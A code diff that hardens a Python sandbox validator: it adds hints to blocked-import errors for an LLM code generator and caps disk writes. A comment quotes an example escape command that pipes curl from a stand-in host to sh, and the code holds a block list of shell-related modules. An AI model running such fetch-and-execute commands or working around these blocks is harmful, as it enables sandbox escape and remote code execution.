@@ -97,6 +97,49 @@ SAFE_MODULES: Set[str] = {
 # Code Validator
 # =============================================================================
 
+# Per-module hint shown alongside the "Blocked module" error.
+#
+# The synth code generator (LLM) reads validator errors verbatim when
+# choosing what to retry — a bare "Blocked module: subprocess" causes
+# the model to loop on the same import, because it assumes it needs
+# `subprocess.run(['apt-get', 'install', ...])` to bootstrap native
+# deps for reportlab / Pillow / pango. Those deps are ALREADY baked
+# into the synth-executor image, so the right behavior is for the
+# model to drop the subprocess import entirely. The hint below makes
+# that explicit and is what closed Sev-1 #795.
+#
+# NEVER unblock subprocess globally — it's a direct sandbox-escape
+# vector (`subprocess.run(['curl', 'evil.example.com|sh'])`). The fix
+# is "tell the model the deps are already there", NOT "let the model
+# fork arbitrary binaries".
+_BLOCKED_MODULE_HINTS: Dict[str, str] = {
+    "subprocess": (
+        "reportlab, Pillow, pypdf, python-docx, openpyxl, pandas, numpy, "
+        "matplotlib, plotly, boto3, kubernetes and other listed modules are "
+        "pre-installed in this sandbox — DO NOT shell out to install them. "
+        "Drop the `import subprocess` and call the library directly "
+        "(e.g. `from reportlab.pdfgen import canvas`)."
+    ),
+    "pty": "subprocess and pty are blocked; libs are pre-installed.",
+    "shlex": "subprocess and shlex are blocked; libs are pre-installed.",
+    "ctypes": "ctypes is blocked — no native loading from sandboxed code.",
+    "multiprocessing": "multiprocessing is blocked — sandbox runs single-process.",
+    "pickle": "pickle is blocked — use json or orjson instead.",
+}
+
+def _blocked_module_error(module_name: str) -> str:
+    """
+    Build the validator error string for a blocked import. The bare-bones
+    "Blocked module: <name>" prefix is unchanged so existing tests/log-greps
+    keep matching; a per-module hint is appended when available so the
+    code-generating LLM has actionable feedback on retry.
+    """
+    top = module_name.split('.')[0]
+    hint = _BLOCKED_MODULE_HINTS.get(top)
+    if hint:
+        return f"Blocked module: {module_name} — {hint}"
+    return f"Blocked module: {module_name}"
+
 class CodeValidator:
     """Validates Python code for security issues before execution."""
 
@@ -128,13 +171,13 @@ class CodeValidator:
                 for alias in node.names:
                     module = alias.name.split('.')[0]
                     if module in BLOCKED_MODULES:
-                        return False, f"Blocked module: {alias.name}"
+                        return False, _blocked_module_error(alias.name)
 
             elif isinstance(node, ast.ImportFrom):
                 if node.module:
                     module = node.module.split('.')[0]
                     if module in BLOCKED_MODULES:
-                        return False, f"Blocked module: {node.module}"
+                        return False, _blocked_module_error(node.module)
                     # Check if module is allowed
                     if module not in self.allowed_modules and module not in SAFE_MODULES:
                         # Check capability modules
@@ -211,6 +254,11 @@ def set_limits(max_memory_mb, max_cpu_seconds):
 
     # Limit open files
     resource.setrlimit(resource.RLIMIT_NOFILE, (64, 64))
+
+    # Limit total bytes the process may write to disk. Caps runaway
+    # file generation (e.g. a malicious payload trying to fill /tmp with
+    # mined blocks or a dumped DB) at 64 MiB.
+    resource.setrlimit(resource.RLIMIT_FSIZE, (64 * 1024 * 1024, 64 * 1024 * 1024))
 
 # Timeout handler
 def timeout_handler(signum, frame):
